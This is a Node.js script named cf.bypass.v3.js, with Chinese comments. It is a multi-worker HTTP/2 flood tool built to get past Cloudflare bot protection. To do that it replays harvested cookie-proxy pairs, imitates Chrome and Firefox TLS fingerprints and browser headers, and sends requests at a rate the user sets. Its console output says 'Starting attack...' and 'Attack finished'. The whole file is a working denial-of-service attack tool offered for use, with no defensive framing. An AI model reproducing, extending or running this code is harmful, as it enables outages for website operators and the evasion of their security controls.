#!/usr/bin/env node
// cf.bypass.v3.js - 支持 Cookie-IP 配对的高性能版本

const fs = require("fs");
const http2 = require("http2");
const tls = require("tls");
const net = require("net");
const cluster = require("cluster");
const crypto = require("crypto");
const { once } = require("events");
const readline = require("readline");
const os = require("os");
const { exec } = require("child_process");

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

const C = {
    reset: "\x1b[0m",
    red: "\x1b[31m",
    green: "\x1b[32m",
    yellow: "\x1b[33m",
    blue: "\x1b[34m",
    magenta: "\x1b[35m",
    cyan: "\x1b[36m",
    white: "\x1b[37m",
    gray: "\x1b[90m",
};

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
net.ipv4.tcp_sack=${sack} \
net.ipv4.tcp_window_scaling=${windowScaling} \
net.ipv4.tcp_timestamps=${timestamps} \
net.ipv4.tcp_sack=${selectiveAck} \
net.ipv4.tcp_fastopen=${tcpFastOpen}`;

    exec(command, (err) => {
        if (err && err.code !== 1) {
            // Silently ignore permission errors
        }
    });
}

/* ============================================================
   MASTER
============================================================ */

const [, , urlStr, durStr, workersStr, qpsStr, cookiePairFileStr] = process.argv;

if (cluster.isMaster) {
    if (!urlStr || !durStr || !workersStr || !qpsStr || !cookiePairFileStr) {
        console.log(`${C.cyan}cf.bypass.v3.js - Cookie-IP 配对高性能版本${C.reset}\n`);
        console.log(`用法: node cf.bypass.v3.js <url> <seconds> <workers> <qps> <cookie-pairs.json>\n`);
        console.log(`参数说明:`);
        console.log(`  url              目标 URL`);
        console.log(`  seconds          持续时间（秒）`);
        console.log(`  workers          Worker 进程数`);
        console.log(`  qps              每秒请求数`);
        console.log(`  cookie-pairs     Cookie-IP 配对文件（JSON 格式）\n`);
        console.log(`示例:`);
        console.log(`  node cf.bypass.v3.js https://target.com 120 16 1000 cookie-ip-pairs.json\n`);
        console.log(`${C.yellow}注意: 请先使用 cf.cookie-harvester.js 生成 Cookie-IP 配对文件${C.reset}`);
        process.exit(1);
    }

    const WORKERS = +workersStr;
    const DURATION_MS = +durStr * 1000;
    const QPS = +qpsStr;

    // 加载 Cookie-IP 配对
    let cookiePairs = [];
    try {
        const rawData = fs.readFileSync(cookiePairFileStr, 'utf8');
        const data = JSON.parse(rawData);
        
        // 支持两种格式：完整格式和简化格式
        if (Array.isArray(data)) {
            cookiePairs = data;
        } else if (data.pairs && Array.isArray(data.pairs)) {
            cookiePairs = data.pairs;
        } else {
            throw new Error('无效的 Cookie-IP 配对文件格式');
        }
        
        if (cookiePairs.length === 0) {
            throw new Error('Cookie-IP 配对文件为空');
        }
    } catch (err) {
        console.error(`${C.red}错误: 无法加载 Cookie-IP 配对文件: ${err.message}${C.reset}`);
        process.exit(1);
    }

    console.log(`${C.green}Target: ${C.white}${urlStr}${C.reset}`);
    console.log(`${C.green}QPS: ${C.white}${QPS}${C.reset}`);
    console.log(`${C.green}Threads: ${C.white}${WORKERS}${C.reset}`);
    console.log(`${C.green}Duration: ${C.white}${durStr}s${C.reset}`);
    console.log(`${C.green}Cookie-IP Pairs: ${C.white}${cookiePairs.length}${C.reset}`);
    console.log(`${C.yellow}Mode: Cookie-IP Paired Mass Concurrent${C.reset}`);
    console.log(`${C.cyan}TCP Optimization: Enabled${C.reset}\n`);

    let statusMap = {};

    cluster.setupMaster({
        execArgv: process.execArgv.concat(['--max-old-space-size=2048'])
    });

    const forkWorker = () => {
        const w = cluster.fork({
            TARGET: urlStr,
            QPS,
            DURATION: DURATION_MS,
            COOKIE_PAIR_FILE: cookiePairFileStr,
            DEBUG: process.argv.includes('--debug') ? '1' : '0'
        });

        w.on("message", msg => {
            if (msg.status) {
                for (const code in msg.status) {
                    statusMap[code] = (statusMap[code] || 0) + msg.status[code];
                }
            }
        });
    };

    function startWorkers() {
        for (let i = 0; i < WORKERS; i++) {
            forkWorker();
        }
    }

    cluster.on("exit", (worker, code, signal) => {
        if (code !== 0 && !worker.exitedAfterDisconnect) {
            forkWorker();
        }
    });

    const printStats = () => {
        const ts = new Date().toISOString().replace('T', ' ').split('.')[0];
        const codes = Object.keys(statusMap).sort((a, b) => a - b);
        
        if (codes.length === 0) return;

        const totalReqs = codes.reduce((sum, c) => sum + statusMap[c], 0);
        const statusStr = codes.map(c => {
            let color = c.startsWith('2') ? C.green : c.startsWith('4') ? C.yellow : C.red;
            return `${color}${c}: ${statusMap[c]}${C.reset}`;
        }).join(', ');
        
        readline.cursorTo(process.stdout, 0);
        readline.clearLine(process.stdout, 0);
        process.stdout.write(`${C.gray}[${ts}]${C.reset} ${C.blue}QPS:${C.reset} ${C.white}${totalReqs}${C.reset} | ${statusStr}`);
        
        statusMap = {};
    };

    setInterval(printStats, 1000);

    // TCP 参数调优 - 每 5 秒随机修改
    setInterval(() => {
        TCP_CHANGES_SERVER();
    }, 5000);

    // 初始调优
    TCP_CHANGES_SERVER();

    console.log(`${C.yellow}Starting attack...${C.reset}\n`);
    startWorkers();

    setTimeout(() => {
        console.log(`\n${C.green}Attack finished.${C.reset}`);
        for (const w of Object.values(cluster.workers)) w.kill();
        setTimeout(() => process.exit(), 300);
    }, DURATION_MS);

    return;
}

/* ============================================================
   WORKER
============================================================ */

const target = new URL(process.env.TARGET);
const QPS = +process.env.QPS;
const DURATION_MS = +process.env.DURATION;
const COOKIE_PAIR_FILE = process.env.COOKIE_PAIR_FILE;
const DEBUG = process.env.DEBUG === '1';

// 动态加载 Cookie 配对
let cookiePairs = [];
let browserHeaders = null;
let challengeToken = null;
let redirectUrl = null;

function loadCookiePairs() {
    try {
        const rawData = fs.readFileSync(COOKIE_PAIR_FILE, 'utf8');
        const data = JSON.parse(rawData);
        
        if (Array.isArray(data)) {
            cookiePairs = data;
        } else if (data.pairs && Array.isArray(data.pairs)) {
            cookiePairs = data.pairs;
        }
        
        // 提取浏览器捕获的真实请求头（从第一个配对）
        if (cookiePairs.length > 0) {
            browserHeaders = cookiePairs[0].headers || null;
            challengeToken = cookiePairs[0].challengeToken || null;
            redirectUrl = cookiePairs[0].redirectUrl || null;
        }
        
        return cookiePairs.length;
    } catch (err) {
        return 0;
    }
}

// 初始加载
loadCookiePairs();

// 每 5 秒重新加载一次 Cookie 文件
setInterval(() => {
    const oldCount = cookiePairs.length;
    const newCount = loadCookiePairs();
    if (newCount > oldCount && DEBUG) {
        debugLog(`Cookie 配对已更新: ${oldCount} -> ${newCount}`);
    }
}, 5000);

let statusCounter = {};

function debugLog(...args) {
    if (DEBUG) {
        const ts = new Date().toISOString().replace('T', ' ').split('.')[0];
        console.log(`[${ts}] [Worker ${process.pid}]`, ...args);
    }
}

// TLS 配置
const TLS_PROFILES = {
    "Chrome-Windows": {
        browserName: "Chrome-Windows",
        version: "120",
        userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ciphers: [
            "TLS_AES_128_GCM_SHA256",
            "TLS_AES_256_GCM_SHA384",
            "TLS_CHACHA20_POLY1305_SHA256",
            "ECDHE-ECDSA-AES128-GCM-SHA256",
            "ECDHE-RSA-AES128-GCM-SHA256",
            "ECDHE-ECDSA-AES256-GCM-SHA384",
            "ECDHE-RSA-AES256-GCM-SHA384",
            "ECDHE-ECDSA-CHACHA20-POLY1305",
            "ECDHE-RSA-CHACHA20-POLY1305",
            "ECDHE-RSA-AES128-SHA",
            "ECDHE-RSA-AES256-SHA",
            "AES128-GCM-SHA256",
            "AES256-GCM-SHA384",
            "AES128-SHA",
            "AES256-SHA"
        ].join(":"),
        curves: "X25519:P-256:P-384",
        sigalgs: "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512",
        alpn: ["h2", "http/1.1"],
        minVersion: "TLSv1.2",
        maxVersion: "TLSv1.3",
        http2Settings: {
            headerTableSize: 65536,
            enablePush: false,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144
        }
    },
    "Firefox": {
        browserName: "Firefox",
        version: "121",
        userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        ciphers: [
            "TLS_AES_128_GCM_SHA256",
            "TLS_CHACHA20_POLY1305_SHA256",
            "TLS_AES_256_GCM_SHA384",
            "ECDHE-ECDSA-AES128-GCM-SHA256",
            "ECDHE-RSA-AES128-GCM-SHA256",
            "ECDHE-ECDSA-CHACHA20-POLY1305",
            "ECDHE-RSA-CHACHA20-POLY1305",
            "ECDHE-ECDSA-AES256-GCM-SHA384",
            "ECDHE-RSA-AES256-GCM-SHA384",
            "ECDHE-ECDSA-AES256-SHA",
            "ECDHE-ECDSA-AES128-SHA",
            "ECDHE-RSA-AES128-SHA",
            "ECDHE-RSA-AES256-SHA",
            "AES128-GCM-SHA256",
            "AES256-GCM-SHA384",
            "AES128-SHA",
            "AES256-SHA"
        ].join(":"),
        curves: "X25519:P-256:P-384:P-521",
        sigalgs: "ecdsa_secp256r1_sha256:ecdsa_secp384r1_sha384:ecdsa_secp521r1_sha512:rsa_pss_rsae_sha256:rsa_pss_rsae_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha256:rsa_pkcs1_sha384:rsa_pkcs1_sha512",
        alpn: ["h2", "http/1.1"],
        minVersion: "TLSv1.2",
        maxVersion: "TLSv1.3",
        http2Settings: {
            headerTableSize: 65536,
            enablePush: false,
            initialWindowSize: 131072,
            maxHeaderListSize: 262144
        }
    }
};

function getTLSClientProfile() {
    const profiles = Object.values(TLS_PROFILES);
    return profiles[Math.floor(Math.random() * profiles.length)];
}

const REFERERS = [
    "https://www.google.com/search?q=",
    "https://www.bing.com/search?q=",
    "https://search.yahoo.com/search?p=",
    "https://duckduckgo.com/?q=",
    target.origin + "/"
];

const ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "ko-KR,ko;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8"
];

function buildHeaders(tlsConfig, cookieString, useChallenge = false) {
    // 如果有浏览器捕获的真实请求头，优先使用
    if (browserHeaders) {
        const headers = {
            ":method": "GET",
            ":authority": browserHeaders.host || browserHeaders[':authority'] || target.host,
            ":scheme": "https",
            ":path": target.pathname + target.search
        };
        
        // 复制浏览器的所有请求头（排除伪头部和特殊头部）
        for (const [key, value] of Object.entries(browserHeaders)) {
            const lowerKey = key.toLowerCase();
            if (!lowerKey.startsWith(':') && 
                lowerKey !== 'host' && 
                lowerKey !== 'cookie' &&
                lowerKey !== 'referer' &&
                lowerKey !== 'content-length' &&
                lowerKey !== 'connection') {
                headers[lowerKey] = value;
            }
        }
        
        // 设置 Referer：第一次请求使用带挑战令牌的，后续使用普通的
        if (useChallenge && redirectUrl) {
            headers["referer"] = redirectUrl;
            if (DEBUG && Math.random() < 0.01) {
                debugLog('使用带挑战令牌的 Referer');
            }
        } else {
            headers["referer"] = target.origin + target.pathname;
        }
        
        // 更新 Cookie
        if (cookieString) {
            headers["cookie"] = cookieString;
        }
        
        if (DEBUG && Math.random() < 0.01) {
            debugLog('使用浏览器捕获的真实请求头');
        }
        
        return headers;
    }
    
    // 降级方案：使用原有的头部构建逻辑
    const referers = [...REFERERS, target.href, target.origin + "/"];
    let referer = referers[Math.floor(Math.random() * referers.length)];
    if (referer.endsWith("?q=")) {
        referer += encodeURIComponent(target.hostname);
    }
    
    const acceptLang = ACCEPT_LANGUAGES[Math.floor(Math.random() * ACCEPT_LANGUAGES.length)];

    const headers = {
        ":method": "GET",
        ":authority": target.host,
        ":scheme": target.protocol.replace(":", ""),
        ":path": target.pathname + target.search
    };

    if (tlsConfig.browserName.includes("Chrome")) {
        headers["sec-ch-ua"] = `"Not/A)Brand";v="8", "Chromium";v="${tlsConfig.version}", "Google Chrome";v="${tlsConfig.version}"`;
        headers["sec-ch-ua-mobile"] = "?0";
        headers["sec-ch-ua-platform"] = '"Windows"';
        headers["sec-ch-ua-arch"] = '"x86"';
        headers["sec-ch-ua-bitness"] = '"64"';
        headers["sec-ch-ua-full-version"] = `"${tlsConfig.version}.0.0.0"`;
        headers["sec-ch-ua-full-version-list"] = `"Not/A)Brand";v="8.0.0.0", "Chromium";v="${tlsConfig.version}.0.0.0", "Google Chrome";v="${tlsConfig.version}.0.0.0"`;
        headers["sec-ch-ua-model"] = '""';
        headers["sec-ch-ua-platform-version"] = '"10.0.0"';
        headers["upgrade-insecure-requests"] = "1";
        headers["user-agent"] = tlsConfig.userAgent;
        headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
        headers["sec-fetch-site"] = referer ? "cross-site" : "none";
        headers["sec-fetch-mode"] = "navigate";
        headers["sec-fetch-user"] = "?1";
        headers["sec-fetch-dest"] = "document";
        headers["accept-encoding"] = "gzip, deflate, br, zstd";
        headers["accept-language"] = acceptLang;
        headers["priority"] = "u=0, i";
        if (referer) headers["referer"] = referer;
    } else if (tlsConfig.browserName.includes("Firefox")) {
        headers["user-agent"] = tlsConfig.userAgent;
        headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
        headers["accept-language"] = acceptLang;
        headers["accept-encoding"] = "gzip, deflate, br";
        headers["upgrade-insecure-requests"] = "1";
        headers["sec-fetch-dest"] = "document";
        headers["sec-fetch-mode"] = "navigate";
        headers["sec-fetch-site"] = referer ? "cross-site" : "none";
        headers["sec-fetch-user"] = "?1";
        if (referer) headers["referer"] = referer;
    }

    if (cookieString) {
        headers["cookie"] = cookieString;
    }

    return headers;
}

async function buildConnection(proxyStr, tlsConfig, cookieString) {
    const hostPort = target.hostname + ":" + (target.port || 443);

    let baseSock;
    let tlsSock;
    let session;

    try {
        const timeoutPromise = new Promise((_, reject) => 
            setTimeout(() => reject(new Error("CONNECT_TIMEOUT")), 10000)
        );

        const connectPromise = (async () => {
            // 直连模式
            if (proxyStr === 'direct') {
                // 优化的 TLS 选项，更接近真实浏览器
                const tlsOptions = {
                    host: target.hostname,
                    port: target.port || 443,
                    servername: target.hostname,
                    ALPNProtocols: tlsConfig.alpn,
                    ciphers: tlsConfig.ciphers,
                    ecdhCurve: tlsConfig.curves,
                    sigalgs: tlsConfig.sigalgs,
                    // 优化的 secureOptions，移除可能导致指纹差异的选项
                    secureOptions: 
                        crypto.constants.SSL_OP_NO_SSLv2 | 
                        crypto.constants.SSL_OP_NO_SSLv3 | 
                        crypto.constants.SSL_OP_NO_COMPRESSION,
                    minVersion: tlsConfig.minVersion,
                    maxVersion: tlsConfig.maxVersion,
                    rejectUnauthorized: false,
                    // 添加 session 复用（浏览器行为）
                    session: undefined,
                    // 请求 OCSP stapling（浏览器行为）
                    requestOCSP: true
                };
                
                tlsSock = tls.connect(tlsOptions);

                await once(tlsSock, "secureConnect");

                // 发送 HTTP/2 连接前缀和 SETTINGS 帧
                session = http2.connect(target.origin, {
                    createConnection: () => tlsSock,
                    settings: tlsConfig.http2Settings,
                    // 添加更多浏览器行为
                    peerMaxConcurrentStreams: 1000
                });
                
                // 发送 WINDOW_UPDATE 帧（模拟 Chrome 行为）
                session.on('connect', () => {
                    // Chrome 在连接后立即发送 WINDOW_UPDATE
                    if (tlsConfig.browserName.includes('Chrome')) {
                        session.setLocalWindowSize(15663105); // Chrome 的窗口大小
                    }
                });

                await once(session, "connect");

                return { session, tlsSock, baseSock: null };
            }
            
            // 代理模式
            const proxy = new URL(proxyStr.startsWith('http') ? proxyStr : `http://${proxyStr}`);
            
            if (proxy.protocol === "https:") {
                baseSock = tls.connect({
                    host: proxy.hostname,
                    port: proxy.port || 443,
                    servername: proxy.hostname,
                    ALPNProtocols: ["h2"],
                    minVersion: "TLSv1.2",
                    maxVersion: "TLSv1.3"
                });
            } else {
                baseSock = net.connect(proxy.port || 80, proxy.hostname);
            }

            await once(baseSock, "connect");

            baseSock.write(`CONNECT ${hostPort} HTTP/1.1\r\nHost: ${hostPort}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);

            const [data] = await once(baseSock, "data");
            const statusLine = data.toString().split('\r\n')[0];
            if (!statusLine.includes("200")) {
                throw new Error("PROXY_CONNECT_FAILED");
            }

            tlsSock = tls.connect({
                socket: baseSock,
                servername: target.hostname,
                ALPNProtocols: tlsConfig.alpn,
                ciphers: tlsConfig.ciphers,
                ecdhCurve: tlsConfig.curves,
                sigalgs: tlsConfig.sigalgs,
                secureOptions: crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL,
                minVersion: tlsConfig.minVersion,
                maxVersion: tlsConfig.maxVersion,
                rejectUnauthorized: false
            });

            await once(tlsSock, "secureConnect");

            session = http2.connect(target.origin, {
                createConnection: () => tlsSock,
                settings: tlsConfig.http2Settings
            });

            await once(session, "connect");

            return { session, tlsSock, baseSock };

        })();

        const result = await Promise.race([connectPromise, timeoutPromise]);
        return result;

    } catch (err) {
        if (tlsSock) tlsSock.destroy();
        if (baseSock) baseSock.destroy();
        throw err;
    }
}

async function go() {
    // 随机选择一个 Cookie-IP 配对
    if (cookiePairs.length === 0) {
        debugLog('没有可用的 Cookie-IP 配对，等待重新加载');
        setTimeout(go, 1000);
        return;
    }
    
    const pair = cookiePairs[Math.floor(Math.random() * cookiePairs.length)];
    const proxyStr = pair.proxy;
    const cookieString = pair.cookie;
    
    const tlsConfig = getTLSClientProfile();
    
    debugLog(`建立连接: ${proxyStr === 'direct' ? '直连' : proxyStr}, 浏览器: ${tlsConfig.browserName}`);
    
    if (DEBUG) {
        debugLog(`TLS 配置详情:`);
        debugLog(`  - User-Agent: ${tlsConfig.userAgent}`);
        debugLog(`  - ALPN: ${tlsConfig.alpn.join(', ')}`);
        debugLog(`  - TLS 版本: ${tlsConfig.minVersion} - ${tlsConfig.maxVersion}`);
        debugLog(`  - Cookie (前50字符): ${cookieString.substring(0, 50)}...`);
    }

    buildConnection(proxyStr, tlsConfig, cookieString).then(({ session }) => {
        debugLog(`连接成功，开始发送请求`);
        
        let requestCount = 0;
        let errorCount = 0;
        // 每个连接每秒发送 1 次请求
        const intervalMs = 1000;
        
        // 首次请求前等待随机时间（模拟真实用户）
        const initialDelay = Math.random() * 2000; // 0-2秒随机延迟
        
        function sendRequest() {
            if (session.closed || session.goawayed || session.destroyed) {
                setTimeout(go, 100);
                return;
            }

            try {
                // 第一次请求使用带挑战令牌的 Referer，后续使用普通 Referer
                const useChallenge = (requestCount === 0);
                const headers = buildHeaders(tlsConfig, cookieString, useChallenge);
                
                // 详细输出请求头（仅前3个请求）
                if (DEBUG && requestCount < 3) {
                    debugLog(`请求 #${requestCount + 1} 请求头:`);
                    for (const [key, value] of Object.entries(headers)) {
                        if (key === 'cookie') {
                            debugLog(`  ${key}: ${value.substring(0, 50)}...`);
                        } else {
                            debugLog(`  ${key}: ${value}`);
                        }
                    }
                }
                
                const req = session.request(headers);
                req.setTimeout(15000, () => req.close(http2.constants.NGHTTP2_CANCEL)); // 增加超时时间

                req.on("response", hdrs => {
                    const code = hdrs[":status"];
                    if (code) {
                        statusCounter[code] = (statusCounter[code] || 0) + 1;
                        
                        if (requestCount === 1 || requestCount % 100 === 0) {
                            debugLog(`请求 #${requestCount}, 状态码: ${code}`);
                            
                            if (DEBUG) {
                                // 详细响应头信息
                                const responseHeaders = {};
                                for (const [key, value] of Object.entries(hdrs)) {
                                    responseHeaders[key] = value;
                                }
                                debugLog(`响应头:`, JSON.stringify(responseHeaders, null, 2));
                            }
                        }
                        
                        if (Object.keys(statusCounter).length > 100) {
                            const codes = Object.keys(statusCounter).sort((a, b) => statusCounter[a] - statusCounter[b]);
                            for (let i = 0; i < 50; i++) {
                                delete statusCounter[codes[i]];
                            }
                        }

                        if (code === 429 || code === 403) {
                            errorCount++;
                            debugLog(`收到限流/禁止响应: ${code}, 错误计数: ${errorCount}`);
                            
                            if (DEBUG) {
                                // 显示限流相关的响应头
                                const limitHeaders = {
                                    'cf-ray': hdrs['cf-ray'],
                                    'cf-cache-status': hdrs['cf-cache-status'],
                                    'server': hdrs['server'],
                                    'retry-after': hdrs['retry-after']
                                };
                                debugLog(`限流响应头:`, JSON.stringify(limitHeaders, null, 2));
                            }
                            
                            // 连续 3 次错误才标记失效，避免误判
                            if (errorCount >= 3) {
                                debugLog(`连续 ${errorCount} 次错误，标记连接失效`);
                                session.goawayed = true;
                            }
                        } else if (code >= 200 && code < 300) {
                            // 成功响应，重置错误计数
                            errorCount = 0;
                        }
                    }
                });
                
                // 收集响应体（仅在调试模式且前几个请求）
                if (DEBUG && requestCount <= 3) {
                    let responseBody = '';
                    req.on('data', chunk => {
                        responseBody += chunk.toString();
                    });
                    req.on('end', () => {
                        if (responseBody.length > 0 && responseBody.length < 1000) {
                            debugLog(`请求 #${requestCount} 响应体:`, responseBody.substring(0, 500));
                        } else if (responseBody.length > 0) {
                            debugLog(`请求 #${requestCount} 响应体长度: ${responseBody.length} 字节`);
                        }
                    });
                }

                req.on("error", () => {});
                req.end();

                requestCount++;
                
                // 添加随机延迟，模拟真实用户行为
                const randomDelay = intervalMs + Math.random() * 100; // 增加 0-100ms 随机延迟
                setTimeout(sendRequest, randomDelay);

            } catch (err) {
                setTimeout(go, 100);
            }
        }

        // 首次请求前等待随机延迟
        setTimeout(sendRequest, initialDelay);

    }).catch((err) => {
        debugLog(`连接失败: ${err.message}`);
        setTimeout(go, 1000);
    });
}

// 启动连接 - 每个 Worker 创建 QPS 个连接
let conns = 0;
// 每个 Worker 创建 QPS 个连接，每个连接每秒发 1 次请求
// 这样每个 Worker 的总 QPS = QPS
const MAX_CONNECTIONS = Math.max(1, QPS);

debugLog(`Worker 启动 - 目标 QPS: ${QPS}, 连接数: ${MAX_CONNECTIONS}, 随机使用 ${cookiePairs.length} 个 IP`);

const connectionInterval = setInterval(() => {
    if (conns < MAX_CONNECTIONS) {
        conns++;
        go();
    } else {
        clearInterval(connectionInterval);
        debugLog(`已建立 ${MAX_CONNECTIONS} 个连接，随机使用可用 IP`);
    }
}, 100); // 每 100ms 建立一个连接

let gcCounter = 0;
setInterval(() => {
    if (process.send) process.send({ status: statusCounter });
    statusCounter = {};
    
    gcCounter++;
    if (gcCounter >= 60 && global.gc) {
        global.gc();
        gcCounter = 0;
    }
}, 1000);
